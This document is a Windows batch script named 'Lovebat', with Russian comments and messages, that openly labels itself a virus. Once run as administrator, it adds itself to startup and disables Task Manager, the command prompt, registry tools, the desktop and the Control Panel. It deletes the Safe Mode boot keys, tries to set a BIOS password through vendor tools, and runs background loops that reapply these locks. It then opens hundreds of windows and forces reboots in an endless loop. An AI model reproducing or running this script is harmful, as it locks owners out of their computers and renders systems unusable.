Lovebat




@echo off
title МАКСИМАЛЬНЫЙ lovebat v7.0 (УЛЬТРА-БЫСТРЫЙ)
color 0c

:: ====== ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ======
net session >nul 2>&1
if %errorlevel% neq 0 (
    cls
    color 4f
    echo ===================================================
    echo        ДОСТУП ЗАПРЕЩЁН!
    echo ===================================================
    echo.
    echo Этот файл можно запустить только с правами
    echo АДМИНИСТРАТОРА!
    echo.
    echo Нажмите правой кнопкой мыши и выберите
    echo "Запуск от имени администратора"
    echo.
    echo ===================================================
    echo.
    echo Нажмите любую клавишу для выхода...
    pause >nul
    exit
)

:: ====== ТЕПЕРЬ ОСНОВНАЯ ЧАСТЬ ======
cls
color 0a
echo ===================================================
echo   virus ЗАПУЩЕН ОТ ИМЕНИ АДМИНИСТРАТОРА!
echo ===================================================
echo.
echo [1/6] Добавление в автозагрузку...
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "virus" /t REG_SZ /d "%~f0" /f >nul
echo [OK]

echo [2/6] Блокировка диспетчера задач...
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
echo [OK]

echo [3/6] Блокировка безопасного режима...
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v SafeModeBlockNonAdmins /t REG_DWORD /d 1 /f >nul
echo [OK]

echo [4/6] БЛОКИРОВКА BIOS (МГНОВЕННАЯ)...
:: Блокируем доступ к BIOS через реестр
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoSecureBoot /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoBootSectorScan /t REG_DWORD /d 1 /f >nul

:: Удаляем возможность входа в BIOS через настройки загрузки
bcdedit /set {current} bootmenupolicy legacy >nul 2>&1
bcdedit /set {current} bootems no >nul 2>&1

:: Пытаемся установить пароль BIOS (если есть утилита)
if exist "C:\Program Files\HP\BIOS Configuration\BiosConfigUtility64.exe" (
    "C:\Program Files\HP\BIOS Configuration\BiosConfigUtility64.exe" /SetAdminPassword:"12345678" >nul 2>&1
)
if exist "C:\Program Files\Dell\Command Configure\X86_64\cctk.exe" (
    "C:\Program Files\Dell\Command Configure\X86_64\cctk.exe" --setuppwd="12345678" >nul 2>&1
)
if exist "C:\Program Files\ASUS\BIOSConfigTool\ACT.exe" (
    "C:\Program Files\ASUS\BIOSConfigTool\ACT.exe" --newpwd "12345678" --pwd "12345678" --set >nul 2>&1
)
if exist "C:\Program Files\Lenovo\BIOS Settings\winflash64.exe" (
    "C:\Program Files\Lenovo\BIOS Settings\winflash64.exe" --password "12345678" >nul 2>&1
)
echo [OK]

echo [5/6] Отключение всех прав пользователя...
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 2 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f >nul
echo [OK]

echo [6/6] Активация вирусного цикла...
echo.
echo ===================================================
echo   ВСЕ ОГРАНИЧЕНИЯ АКТИВИРОВАНЫ!
echo   МГНОВЕННАЯ ПЕРЕЗАГРУЗКА!
echo ===================================================
echo.
echo Открываем 200 окон и СРАЗУ перезагружаемся!
echo ===================================================
echo.

:: ====== ЗАПУСКАЕМ ФОНОВЫЕ ПРОЦЕССЫ ДЛЯ БЛОКИРОВКИ ======
:: Постоянная блокировка выключения (каждые 5 секунд)
start /b "" cmd /c ":loop timeout /t 5 /nobreak >nul & taskkill /f /im shutdown.exe >nul 2>&1 & goto loop"

:: Постоянное восстановление ограничений
start /b "" cmd /c ":loop2 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul & timeout /t 10 /nobreak >nul & goto loop2"

:: Постоянное закрытие диспетчера задач
start /b "" cmd /c ":loop3 taskkill /f /im taskmgr.exe >nul 2>&1 & timeout /t 2 /nobreak >nul & goto loop3"

:: Постоянное удаление безопасного режима
start /b "" cmd /c ":loop4 reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /f >nul 2>&1 & reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /f >nul 2>&1 & timeout /t 10 /nobreak >nul & goto loop4"

:: ====== ОТКРЫВАЕМ 200 ОКОН С МГНОВЕННОЙ ПЕРЕЗАГРУЗКОЙ ======
for /l %%i in (1,1,200) do (
    start "" cmd /c "color 0c & cls & echo ================================== & echo ВИРУС АКТИВЕН! & echo ================================== & echo Окно #%%i из 200 & echo. & echo ВСЕ ФУНКЦИИ ЗАБЛОКИРОВАНЫ! & echo - Диспетчер задач: ОТКЛЮЧЁН & echo - Безопасный режим: УДАЛЁН & echo - BIOS: ЗАБЛОКИРОВАН & echo - Выключение: ОТКЛЮЧЕНО & echo - Реестр: ЗАКРЫТ & echo ================================== & echo. & echo ПЕРЕЗАГРУЗКА МГНОВЕННО! & echo. & shutdown /r /t 0 /f & wmic os where primary=true call reboot & powershell -command Restart-Computer -Force"
)

:: ====== МГНОВЕННАЯ ПЕРЕЗАГРУЗКА (ПАРАЛЛЕЛЬНО) ======
:: Запускаем перезагрузку сразу, не дожидаясь окон
shutdown /r /t 0 /f

:: Дополнительные способы на случай, если shutdown заблокирован
wmic os where primary=true call reboot

:: Ещё один способ через PowerShell
powershell -command "Restart-Computer -Force"

:: Если ничего не работает, используем системный вызов
rundll32.exe powrprof.dll,SetSuspendState 0,1,0

:: ====== БЕСКОНЕЧНЫЙ ЦИКЛ (на случай, если перезагрузка не сработала) ======
:start
cls
echo ===================================================
echo   ПЕРЕЗАГРУЗКА НЕ УДАЛАСЬ!
echo   ПЫТАЕМСЯ СНОВА...
echo ===================================================
echo.

:: Открываем ещё 200 окон
for /l %%i in (1,1,200) do (
    start "" cmd /c "echo ВИРУС! ПЕРЕЗАГРУЗКА! & shutdown /r /t 0 /f"
)

:: Ждём 2 секунды и снова перезагружаем
timeout /t 2 /nobreak
shutdown /r /t 0 /f
wmic os where primary=true call reboot
powershell -command "Restart-Computer -Force"

:: Если не сработало, пытаемся через Taskkill (завершаем систему)
taskkill /f /im explorer.exe
taskkill /f /im svchost.exe

goto start